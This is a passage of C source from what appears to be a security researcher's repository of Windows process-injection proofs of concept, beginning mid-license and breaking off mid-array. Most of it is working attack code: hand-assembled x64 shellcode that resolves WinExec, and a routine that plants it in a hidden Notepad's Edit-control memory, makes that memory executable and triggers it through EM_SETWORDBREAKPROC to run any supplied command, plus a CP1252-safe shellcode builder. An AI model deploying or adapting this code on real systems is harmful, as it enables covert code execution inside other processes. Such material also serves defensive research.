  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#define UNICODE
#include <windows.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")

#define WINEXEC2_SIZE 212

char WINEXEC2[] = {
  /* 0000 */ "\x56"                     /* push      rsi                               */
  /* 0001 */ "\x53"                     /* push      rbx                               */
  /* 0002 */ "\x57"                     /* push      rdi                               */
  /* 0003 */ "\x55"                     /* push      rbp                               */
  /* 0004 */ "\xeb\x0a"                 /* jmp       0x10                              */
  /* 0006 */ "\x59"                     /* pop       rcx                               */
  /* 0007 */ "\x51"                     /* push      rcx                               */
  /* 0008 */ "\x31\xc0"                 /* xor       eax, eax                          */
  /* 000A */ "\xb0\xbf"                 /* mov       al, 0xbf                          */
  /* 000C */ "\x48\x01\xc1"             /* add       rcx, rax                          */
  /* 000F */ "\xc3"                     /* ret                                         */
  /* 0010 */ "\xe8\xf1\xff\xff\xff"     /* call      6                                 */
  /* 0015 */ "\xb0\xc8"                 /* mov       al, 0xc8                          */
  /* 0017 */ "\x48\x29\xc4"             /* sub       rsp, rax                          */
  /* 001A */ "\x51"                     /* push      rcx                               */
  /* 001B */ "\x6a\x60"                 /* push      0x60                              */
  /* 001D */ "\x41\x5b"                 /* pop       r11                               */
  /* 001F */ "\x65\x49\x8b\x03"         /* mov       rax, qword ptr gs:[r11]           */
  /* 0023 */ "\x48\x8b\x40\x18"         /* mov       rax, qword ptr [rax + 0x18]       */
  /* 0027 */ "\x48\x8b\x78\x10"         /* mov       rdi, qword ptr [rax + 0x10]       */
  /* 002B */ "\xeb\x03"                 /* jmp       0x30                              */
  /* 002D */ "\x48\x8b\x3f"             /* mov       rdi, qword ptr [rdi]              */
  /* 0030 */ "\x48\x8b\x5f\x30"         /* mov       rbx, qword ptr [rdi + 0x30]       */
  /* 0034 */ "\x8b\x73\x3c"             /* mov       esi, dword ptr [rbx + 0x3c]       */
  /* 0037 */ "\x44\x01\xde"             /* add       esi, r11d                         */
  /* 003A */ "\x8b\x4c\x33\x28"         /* mov       ecx, dword ptr [rbx + rsi + 0x28] */
  /* 003E */ "\x67\xe3\xec"             /* jecxz     0x2d                              */
  /* 0041 */ "\x48\x8d\x74\x0b\x18"     /* lea       rsi, qword ptr [rbx + rcx + 0x18] */
  /* 0046 */ "\xad"                     /* lodsd     eax, dword ptr [rsi]              */
  /* 0047 */ "\x91"                     /* xchg      eax, ecx                          */
  /* 0048 */ "\x67\xe3\xe2"             /* jecxz     0x2d                              */
  /* 004B */ "\xad"                     /* lodsd     eax, dword ptr [rsi]              */
  /* 004C */ "\x41\x90"                 /* xchg      eax, r8d                          */
  /* 004E */ "\x49\x01\xd8"             /* add       r8, rbx                           */
  /* 0051 */ "\xad"                     /* lodsd     eax, dword ptr [rsi]              */
  /* 0052 */ "\x95"                     /* xchg      eax, ebp                          */
  /* 0053 */ "\x48\x01\xdd"             /* add       rbp, rbx                          */
  /* 0056 */ "\xad"                     /* lodsd     eax, dword ptr [rsi]              */
  /* 0057 */ "\x41\x91"                 /* xchg      eax, r9d                          */
  /* 0059 */ "\x49\x01\xd9"             /* add       r9, rbx                           */
  /* 005C */ "\x8b\x74\x8d\xfc"         /* mov       esi, dword ptr [rbp + rcx*4 - 4]  */
  /* 0060 */ "\x48\x01\xde"             /* add       rsi, rbx                          */
  /* 0063 */ "\x31\xc0"                 /* xor       eax, eax                          */
  /* 0065 */ "\x99"                     /* cdq                                         */
  /* 0066 */ "\xac"                     /* lodsb     al, byte ptr [rsi]                */
  /* 0067 */ "\x01\xc2"                 /* add       edx, eax                          */
  /* 0069 */ "\xc1\xca\x08"             /* ror       edx, 8                            */
  /* 006C */ "\xfe\xc8"                 /* dec       al                                */
  /* 006E */ "\x79\xf6"                 /* jns       0x66                              */
  /* 0070 */ "\x81\xfa\x47\x9a\x92\x1b" /* cmp       edx, 0x1b929a47                   */
  /* 0076 */ "\xe0\xe4"                 /* loopne    0x5c                              */
  /* 0078 */ "\x75\xb3"                 /* jne       0x2d                              */
  /* 007A */ "\x41\x0f\xb7\x04\x49"     /* movzx     eax, word ptr [r9 + rcx*2]        */
  /* 007F */ "\x41\x8b\x04\x80"         /* mov       eax, dword ptr [r8 + rax*4]       */
  /* 0083 */ "\x48\x01\xc3"             /* add       rbx, rax                          */
  /* 0086 */ "\x5a"                     /* pop       rdx                               */
  /* 0087 */ "\x4d\x31\xc0"             /* xor       r8, r8                            */
  /* 008A */ "\x4d\x31\xc9"             /* xor       r9, r9                            */
  /* 008D */ "\x31\xc0"                 /* xor       eax, eax                          */
  /* 008F */ "\x48\x89\x44\x24\x20"     /* mov       qword ptr [rsp + 0x20], rax       */
  /* 0094 */ "\x48\x89\x44\x24\x28"     /* mov       qword ptr [rsp + 0x28], rax       */
  /* 0099 */ "\x48\x89\x44\x24\x30"     /* mov       qword ptr [rsp + 0x30], rax       */
  /* 009E */ "\x48\x89\x44\x24\x38"     /* mov       qword ptr [rsp + 0x38], rax       */
  /* 00A3 */ "\x48\x8d\x7c\x24\x50"     /* lea       rdi, qword ptr [rsp + 0x50]       */
  /* 00A8 */ "\x48\x89\x7c\x24\x48"     /* mov       qword ptr [rsp + 0x48], rdi       */
  /* 00AD */ "\x48\x8d\x7c\x24\x60"     /* lea       rdi, qword ptr [rsp + 0x60]       */
  /* 00B2 */ "\x48\x89\x7c\x24\x40"     /* mov       qword ptr [rsp + 0x40], rdi       */
  /* 00B7 */ "\x31\xc9"                 /* xor       ecx, ecx                          */
  /* 00B9 */ "\x6a\x68"                 /* push      0x68                              */
  /* 00BB */ "\x58"                     /* pop       rax                               */
  /* 00BC */ "\xab"                     /* stosd     dword ptr [rdi], eax              */
  /* 00BD */ "\x48\x83\xe8\x04"         /* sub       rax, 4                            */
  /* 00C1 */ "\x91"                     /* xchg      eax, ecx                          */
  /* 00C2 */ "\xf3\xaa"                 /* rep stosb byte ptr [rdi], al                */
  /* 00C4 */ "\xff\xd3"                 /* call      rbx                               */
  /* 00C6 */ "\x31\xc0"                 /* xor       eax, eax                          */
  /* 00C8 */ "\xb0\xc8"                 /* mov       al, 0xc8                          */
  /* 00CA */ "\x48\x01\xc4"             /* add       rsp, rax                          */
  /* 00CD */ "\x31\xc0"                 /* xor       eax, eax                          */
  /* 00CF */ "\x5d"                     /* pop       rbp                               */
  /* 00D0 */ "\x5f"                     /* pop       rdi                               */
  /* 00D1 */ "\x5b"                     /* pop       rbx                               */
  /* 00D2 */ "\x5e"                     /* pop       rsi                               */
  /* 00D3 */ "\xc3"                     /* ret                                         */
};

#define NOTEPAD_PATH L"%SystemRoot%\\system32\\notepad.exe"

VOID em_inject(PWCHAR cmd) {
    HWND                npw, ecw;
    PVOID               emh, embuf;
    SIZE_T              rd;
    DWORD               old, cmd_len;
    PBYTE               cs;
    WCHAR               path[MAX_PATH];
    PROCESS_INFORMATION pi;
    STARTUPINFO         si;
    
    // execute notepad and wait for it to initialize
    ZeroMemory(&si, sizeof(si));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    ExpandEnvironmentStrings(NOTEPAD_PATH, path, MAX_PATH);
    CreateProcess(path, cmd, NULL, NULL, 
      FALSE, 0, NULL, NULL, &si, &pi);
    WaitForInputIdle(pi.hProcess, INFINITE);
    
    // setup shellcode with user-supplied command
    cmd_len = wcslen(cmd) * 2;
    cs = calloc(sizeof(BYTE), WINEXEC2_SIZE + cmd_len + 2);
    memcpy(cs, WINEXEC2, WINEXEC2_SIZE);
    memcpy(&cs[WINEXEC2_SIZE], cmd, cmd_len);
    
    // send the shellcode to Edit control and wait for it to be processed
    npw = FindWindow(L"Notepad", NULL);
    ecw = FindWindowEx(npw, NULL, L"Edit", NULL);
    SendMessage(ecw, WM_SETTEXT, 0, (LPARAM)cs);
    WaitForInputIdle(pi.hProcess, INFINITE);
    
    // read the address of memory for edit control
    emh = (PVOID)SendMessage(ecw, EM_GETHANDLE, 0, 0);
    ReadProcessMemory(pi.hProcess, emh, &embuf, sizeof(ULONG_PTR), &rd);
    VirtualProtectEx(pi.hProcess, embuf, 4096, PAGE_EXECUTE_READWRITE, &old);

    // execute shellcode
    SendMessage(ecw, EM_SETWORDBREAKPROC, 0, (LPARAM)embuf);
    SendMessage(ecw, WM_LBUTTONDBLCLK, MK_LBUTTON, (LPARAM)0x000a000a);
    SendMessage(ecw, EM_SETWORDBREAKPROC, 0, (LPARAM)NULL);
    
    // cleanup and exit
    free(cs);
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

int main(void) {
    WCHAR **argv;
    int   argc;
    
    argv = CommandLineToArgvW(GetCommandLine(), &argc);
    if(argc != 2) {
      printf("usage: em_inject <command>\n");
      return 0;
    }
    
    em_inject(argv[1]);
    
    return 0;
}
```

`eminject/poc_old.c`:

```c
/**
  Copyright © 2020 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <inttypes.h>
#include <limits.h>

#include <windows.h>
#include <commctrl.h>
#include <tlhelp32.h>

#pragma comment(lib, "user32.lib")

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef union _w64_t {
    uint8_t  b[8];
    uint16_t h[4];
    uint32_t w[2];
    uint64_t q;
    void *p;
} w64_t;

// default is 1 second
#define WAIT_TIME 1000

// obtain process name from process id
PCHAR pid2name(DWORD pid) {
    HANDLE         ss;
    BOOL           r;
    PROCESSENTRY32 pe;
    PCHAR          str="N/A";
    
    ss = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (ss != INVALID_HANDLE_VALUE) {
      pe.dwSize = sizeof(PROCESSENTRY32);
      
      if(Process32First(ss, &pe)) {
        do {
          if (pe.th32ProcessID == pid) {
            str = pe.szExeFile;
            break;
          }
        } while (Process32Next(ss, &pe));
        CloseHandle(ss);
      }
    }
    return str;
}

// obtain process id from process name
DWORD name2pid(LPSTR ImageName) {
    HANDLE         ss;
    PROCESSENTRY32 pe;
    DWORD          pid=0;
    
    // create snapshot of system
    ss = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(ss == INVALID_HANDLE_VALUE) return 0;
    
    pe.dwSize = sizeof(PROCESSENTRY32);

    // get first process
    if(Process32First(ss, &pe)){
      do {
        if (lstrcmpi(ImageName, pe.szExeFile)==0) {
          pid = pe.th32ProcessID;
          break;
        }
      } while(Process32Next(ss, &pe));
    }
    CloseHandle(ss);
    return pid;
}

// read base address of DLL loaded in remote process
LPVOID GetProcessModuleHandle(DWORD pid, LPCSTR lpModuleName) {
    HANDLE        ss;
    MODULEENTRY32 me;
    LPVOID        ba = NULL;
    
    ss = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    
    if(ss == INVALID_HANDLE_VALUE) return NULL;
    
    me.dwSize = sizeof(MODULEENTRY32);
    
    if(Module32First(ss, &me)) {
      do {
        if(me.th32ProcessID == pid) {
          if(lstrcmpi(me.szModule, lpModuleName)==0) {
            ba = me.modBaseAddr;
            break;
          }
        }
      } while(Module32Next(ss, &me));
    }
    CloseHandle(ss);
    return ba;
}

// the max address for virtual memory on 
// windows is (2 ^ 47) - 1 or 0x7FFFFFFFFFFF
#define MAX_ADDR 6

// only useful for CP_ACP codepage
static
int is_cp1252_allowed(int ch) {
  
    // zero is allowed, but we can't use it for the clipboard
    if(ch == 0) return 0;
    
    // bytes converted to double byte characters
    if(ch >= 0x80 && ch <= 0x8C) return 0;
    if(ch >= 0x91 && ch <= 0x9C) return 0;
    
    return (ch != 0x8E && ch != 0x9E && ch != 0x9F);
}

// Allocate 64-bit buffer on the stack.
// Then place the address in RDI for writing.
#define STORE_ADDR_SIZE 10

char STORE_ADDR[] = {
  /* 0000 */ "\x6a\x00"             /* push 0                */
  /* 0002 */ "\x54"                 /* push rsp              */
  /* 0003 */ "\x00\x5d\x00"         /* add  byte [rbp], cl   */
  /* 0006 */ "\x5f"                 /* pop  rdi              */
  /* 0007 */ "\x00\x5d\x00"         /* add  byte [rbp], cl   */
};

// Load an 8-Bit immediate value into AH
#define LOAD_BYTE_SIZE 5

char LOAD_BYTE[] = {
  /* 0000 */ "\xb8\x00\xff\x00\x4d" /* mov   eax, 0x4d00ff00 */
};

// Subtract 32 from AH
#define SUB_BYTE_SIZE 8

char SUB_BYTE[] = {
  /* 0000 */ "\x00\x5d\x00"         /* add   byte [rbp], cl  */
  /* 0003 */ "\x2d\x00\x20\x00\x5d" /* sub   eax, 0x4d002000 */
};

// Store AH in buffer and advance RDI by 1
#define STORE_BYTE_SIZE 9

char STORE_BYTE[] = {
  /* 0000 */ "\x00\x27"             /* add   byte [rdi], ah  */
  /* 0002 */ "\x00\x5d\x00"         /* add   byte [rbp], cl  */
  /* 0005 */ "\xae"                 /* scasb                 */
  /* 0006 */ "\x00\x5d\x00"         /* add   byte [rbp], cl  */
};

// Transfers control of execution to address on the stack
#define RET_SIZE 2

char RET[] = {
  /* 0000 */ "\xc3" /* ret  */
  /* 0002 */ "\x00"
};

#define CALC3_SIZE 164
#define RET_OFS 0x20 + 2

char CALC3[] = {
  /* 0000 */ "\xb0\x00"                 /* mov   al, 0                 */
  /* 0002 */ "\xc8\x00\x01\x00"         /* enter 0x100, 0              */
  /* 0006 */ "\x55"                     /* push  rbp                   */
  /* 0007 */ "\x00\x45\x00"             /* add   byte [rbp], al        */
  /* 000A */ "\x6a\x00"                 /* push  0                     */
  /* 000C */ "\x54"                     /* push  rsp                   */
  /* 000D */ "\x00\x45\x00"             /* add   byte [rbp], al        */
  /* 0010 */ "\x5d"                     /* pop   rbp                   */
  /* 0011 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0014 */ "\x57"                     /* push  rdi                   */
  /* 0015 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0018 */ "\x56"                     /* push  rsi                   */
  /* 0019 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 001C */ "\x53"                     /* push  rbx                   */
  /* 001D */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0020 */ "\xb8\x00\x4d\x00\xff"     /* mov   eax, 0xff004d00       */
  /* 0025 */ "\x00\xe1"                 /* add   cl, ah                */
  /* 0027 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 002A */ "\xb8\x00\x01\x00\xff"     /* mov   eax, 0xff000100       */
  /* 002F */ "\x00\xe5"                 /* add   ch, ah                */
  /* 0031 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0034 */ "\x51"                     /* push  rcx                   */
  /* 0035 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0038 */ "\x5b"                     /* pop   rbx                   */
  /* 0039 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 003C */ "\x6a\x00"                 /* push  0                     */
  /* 003E */ "\x54"                     /* push  rsp                   */
  /* 003F */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0042 */ "\x5f"                     /* pop   rdi                   */
  /* 0043 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0046 */ "\x57"                     /* push  rdi                   */
  /* 0047 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 004A */ "\x59"                     /* pop   rcx                   */
  /* 004B */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 004E */ "\x6a\x00"                 /* push  0                     */
  /* 0050 */ "\x54"                     /* push  rsp                   */
  /* 0051 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0054 */ "\x58"                     /* pop   rax                   */
  /* 0055 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0058 */ "\xc7\x00\x63\x00\x6c\x00" /* mov   dword [rax], 0x6c0063 */
  /* 005E */ "\x58"                     /* pop   rax                   */
  /* 005F */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0062 */ "\x35\x00\x61\x00\x63"     /* xor   eax, 0x63006100       */
  /* 0067 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 006A */ "\xab"                     /* stosd                       */
  /* 006B */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 006E */ "\x6a\x00"                 /* push  0                     */
  /* 0070 */ "\x54"                     /* push  rsp                   */
  /* 0071 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0074 */ "\x58"                     /* pop   rax                   */
  /* 0075 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0078 */ "\xc6\x00\x05"             /* mov   byte [rax], 5         */
  /* 007B */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 007E */ "\x5a"                     /* pop   rdx                   */
  /* 007F */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0082 */ "\x53"                     /* push  rbx                   */
  /* 0083 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0086 */ "\x6a\x00"                 /* push  0                     */
  /* 0088 */ "\x6a\x00"                 /* push  0                     */
  /* 008A */ "\x6a\x00"                 /* push  0                     */
  /* 008C */ "\x6a\x00"                 /* push  0                     */
  /* 008E */ "\x6a\x00"                 /* push  0                     */
  /* 0090 */ "\x53"                     /* push  rbx                   */
  /* 0091 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0094 */ "\x90"                     /* nop                         */
  /* 0095 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0098 */ "\x90"                     /* nop                         */
  /* 0099 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 009C */ "\x90"                     /* nop                         */
  /* 009D */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 00A0 */ "\x90"                     /* nop                         */
  /* 00A1 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
};

#define CALC4_SIZE 79
#define RET_OFS2 0x18 + 2

char CALC4[] = {
  /* 0000 */ "\x59"                 /* pop  rcx              */
  /* 0001 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0004 */ "\x59"                 /* pop  rcx              */
  /* 0005 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0008 */ "\x59"                 /* pop  rcx              */
  /* 0009 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 000C */ "\x59"                 /* pop  rcx              */
  /* 000D */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0010 */ "\x59"                 /* pop  rcx              */
  /* 0011 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0014 */ "\x59"                 /* pop  rcx              */
  /* 0015 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0018 */ "\xb8\x00\x4d\x00\xff" /* mov  eax, 0xff004d00  */
  /* 001D */ "\x00\xe1"             /* add  cl, ah           */
  /* 001F */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0022 */ "\x51"                 /* push rcx              */
  /* 0023 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0026 */ "\x58"                 /* pop  rax              */
  /* 0027 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 002A */ "\xc6\x00\xc3"         /* mov  byte [rax], 0xc3 */
  /* 002D */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0030 */ "\x59"                 /* pop  rcx              */
  /* 0031 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0034 */ "\x5b"                 /* pop  rbx              */
  /* 0035 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0038 */ "\x5e"                 /* pop  rsi              */
  /* 0039 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 003C */ "\x5f"                 /* pop  rdi              */
  /* 003D */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0040 */ "\x59"                 /* pop  rcx              */
  /* 0041 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0044 */ "\x6a\x00"             /* push 0                */
  /* 0046 */ "\x58"                 /* pop  rax              */
  /* 0047 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 004A */ "\x5c"                 /* pop  rsp              */
  /* 004B */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 004E */ "\x5d"                 /* pop  rbp              */
};

static
u8* cp1252_generate_winexec(int pid, int *cslen) {
    int     i, ofs, outlen;
    u8      *cs, *out;
    HMODULE m;
    w64_t   addr;
    
    // it won't exceed 512 bytes
    out = (u8*)cs = VirtualAlloc(
      NULL, 4096, 
      MEM_COMMIT | MEM_RESERVE, 
      PAGE_EXECUTE_READWRITE);
    
    // initialize parameters for WinExec()
    memcpy(out, CALC3, CALC3_SIZE);
    out += CALC3_SIZE;

    // initialize RDI for writing
    memcpy(out, STORE_ADDR, STORE_ADDR_SIZE);
    out += STORE_ADDR_SIZE;

    // ***********************************
    // store kernel32!WinExec on stack
    m = GetModuleHandle("kernel32");
    printf("  [+] Local Base address for kernel32 : %p\n", (PVOID)m);
    addr.q = ((PBYTE)GetProcAddress(m, "WinExec") - (PBYTE)m);
    m = GetProcessModuleHandle(pid, "kernel32.dll");
    printf("  [+] Remote Base address for kernel32 : %p\n", (PVOID)m);
    addr.q += (ULONG_PTR)m;
    
    for(i=0; i<MAX_ADDR; i++) {      
      // load a byte into AH
      memcpy(out, LOAD_BYTE, LOAD_BYTE_SIZE);
      out[2] = addr.b[i];
    
      // if byte not allowed for CP1252, add 32
      if(!is_cp1252_allowed(out[2])) {
        out[2] += 32;
        // subtract 32 from byte at runtime
        memcpy(&out[LOAD_BYTE_SIZE], SUB_BYTE, SUB_BYTE_SIZE);
        out += SUB_BYTE_SIZE;
      }
      out += LOAD_BYTE_SIZE;
      // store AH in [RDI], increment RDI
      memcpy(out, STORE_BYTE, STORE_BYTE_SIZE);
      out += STORE_BYTE_SIZE;
    }
    
    // calculate length of constructed code
    ofs = (int)(out - (u8*)cs) + 2;
    
    // first offset
    cs[RET_OFS] = (uint8_t)ofs;
    
    memcpy(out, RET, RET_SIZE);
    out += RET_SIZE;
    
    memcpy(out, CALC4, CALC4_SIZE);
    
    // second offset
    ofs = CALC4_SIZE;
    ((u8*)out)[RET_OFS2] = (uint8_t)ofs;
    out += CALC4_SIZE;
    
    outlen = ((int)(out - (u8*)cs) + 1) & -2;

    FILE *fd = fopen("unicode.bin", "wb");
    fwrite(cs, 1, outlen, fd);
    fclose(fd);
    
    // convert to ascii
    for(i=0; i<=outlen; i+=2) {
      cs[i/2] = cs[i];
    }

    *cslen = outlen / 2;
    
    // save to file for inspection
    fd = fopen("ascii.bin", "wb");
    fwrite(cs, 1, *cslen, fd);
    fclose(fd);
    
    // return pointer to code
    return cs;
}

// copy data to the clipboard
BOOL CopyToClipboard(UINT format, void *data, int cch) {
    LPTSTR  str; 
    HGLOBAL gmem = NULL;
    BOOL    bResult = FALSE;
    HANDLE  hcb;
    
    if(!OpenClipboard(NULL)) {
      printf("  [-] %s : OpenClipboard() failed.\n", __FUNCTION__);
      return FALSE;
    }
    
    if(!EmptyClipboard()) {
      printf("  [-] %s : EmptyClipboard() failed.\n", __FUNCTION__);
      goto exit_copy;
    }
      
    gmem = GlobalAlloc(
      GMEM_MOVEABLE | GMEM_ZEROINIT, (cch + 8));
      
    if(gmem == NULL) {
      printf("  [-] %s : GlobalAlloc() failed.\n", __FUNCTION__);
      goto exit_copy;
    }
    
    str = GlobalLock(gmem); 
    if(str == NULL) {
      printf("  [-] %s : GlobalLock failed.\n", __FUNCTION__);
      goto exit_copy;
    }
    
    CopyMemory(str, data, cch); 
    GlobalUnlock(gmem);
    hcb = SetClipboardData(format, gmem);
    bResult = (hcb != NULL);
exit_copy:
    if(gmem != NULL) GlobalFree(gmem);
    CloseClipboard();
    return bResult;
}

#define WINEXEC_SIZE 197

char WINEXEC[] = {
  /* 0000 */ "\x56"                     /* push      rsi                           */
  /* 0001 */ "\x53"                     /* push      rbx                           */
  /* 0002 */ "\x57"                     /* push      rdi                           */
  /* 0003 */ "\x55"                     /* push      rbp                           */
  /* 0004 */ "\x31\xc0"                 /* xor       eax, eax                      */
  /* 0006 */ "\xb0\xc8"                 /* mov       al, 0xc8                      */
  /* 0008 */ "\x48\x29\xc4"             /* sub       rsp, rax                      */
  /* 000B */ "\x51"                     /* push      rcx                           */
  /* 000C */ "\x6a\x60"                 /* push      0x60                          */
  /* 000E */ "\x41\x5b"                 /* pop       r11                           */
  /* 0010 */ "\x65\x49\x8b\x03"         /* mov       rax, qword gs:[r11]           */
  /* 0014 */ "\x48\x8b\x40\x18"         /* mov       rax, qword [rax + 0x18]       */
  /* 0018 */ "\x48\x8b\x78\x10"         /* mov       rdi, qword [rax + 0x10]       */
  /* 001C */ "\xeb\x03"                 /* jmp       0x21                          */
  /* 001E */ "\x48\x8b\x3f"             /* mov       rdi, qword [rdi]              */
  /* 0021 */ "\x48\x8b\x5f\x30"         /* mov       rbx, qword [rdi + 0x30]       */
  /* 0025 */ "\x8b\x73\x3c"             /* mov       esi, dword [rbx + 0x3c]       */
  /* 0028 */ "\x44\x01\xde"             /* add       esi, r11d                     */
  /* 002B */ "\x8b\x4c\x33\x28"         /* mov       ecx, dword [rbx + rsi + 0x28] */
  /* 002F */ "\x67\xe3\xec"             /* jecxz     0x1e                          */
  /* 0032 */ "\x48\x8d\x74\x0b\x18"     /* lea       rsi, qword [rbx + rcx + 0x18] */
  /* 0037 */ "\xad"                     /* lodsd                                   */
  /* 0038 */ "\x91"                     /* xchg      eax, ecx                      */
  /* 0039 */ "\x67\xe3\xe2"             /* jecxz     0x1e                          */
  /* 003C */ "\xad"                     /* lodsd                                   */
  /* 003D */ "\x41\x90"                 /* xchg      eax, r8d                      */
  /* 003F */ "\x49\x01\xd8"             /* add       r8, rbx                       */
  /* 0042 */ "\xad"                     /* lodsd                                   */
  /* 0043 */ "\x95"                     /* xchg      eax, ebp                      */
  /* 0044 */ "\x48\x01\xdd"             /* add       rbp, rbx                      */
  /* 0047 */ "\xad"                     /* lodsd                                   */
  /* 0048 */ "\x41\x91"                 /* xchg      eax, r9d                      */
  /* 004A */ "\x49\x01\xd9"             /* add       r9, rbx                       */
  /* 004D */ "\x8b\x74\x8d\xfc"         /* mov       esi, dword [rbp + rcx*4 - 4]  */
  /* 0051 */ "\x48\x01\xde"             /* add       rsi, rbx                      */
  /* 0054 */ "\x31\xc0"                 /* xor       eax, eax                      */
  /* 0056 */ "\x99"                     /* cdq                                     */
  /* 0057 */ "\xac"                     /* lodsb                                   */
  /* 0058 */ "\x01\xc2"                 /* add       edx, eax                      */
  /* 005A */ "\xc1\xca\x08"             /* ror       edx, 8                        */
  /* 005D */ "\xfe\xc8"                 /* dec       al                            */
  /* 005F */ "\x79\xf6"                 /* jns       0x57                          */
  /* 0061 */ "\x81\xfa\x47\x9a\x92\x1b" /* cmp       edx, 0x1b929a47               */
  /* 0067 */ "\xe0\xe4"                 /* loopne    0x4d                          */
  /* 0069 */ "\x75\xb3"                 /* jne       0x1e                          */
  /* 006B */ "\x41\x0f\xb7\x04\x49"     /* movzx     eax, word [r9 + rcx*2]        */
  /* 0070 */ "\x41\x8b\x04\x80"         /* mov       eax, dword [r8 + rax*4]       */
  /* 0074 */ "\x48\x01\xc3"             /* add       rbx, rax                      */
  /* 0077 */ "\x5a"                     /* pop       rdx                           */
  /* 0078 */ "\x4d\x31\xc0"             /* xor       r8, r8                        */
  /* 007B */ "\x4d\x31\xc9"             /* xor       r9, r9                        */
  /* 007E */ "\x31\xc0"                 /* xor       eax, eax                      */
  /* 0080 */ "\x48\x89\x44\x24\x20"     /* mov       qword [rsp + 0x20], rax       */
  /* 0085 */ "\x48\x89\x44\x24\x28"     /* mov       qword [rsp + 0x28], rax       */
  /* 008A */ "\x48\x89\x44\x24\x30"     /* mov       qword [rsp + 0x30], rax       */
  /* 008F */ "\x48\x89\x44\x24\x38"     /* mov       qword [rsp + 0x38], rax       */
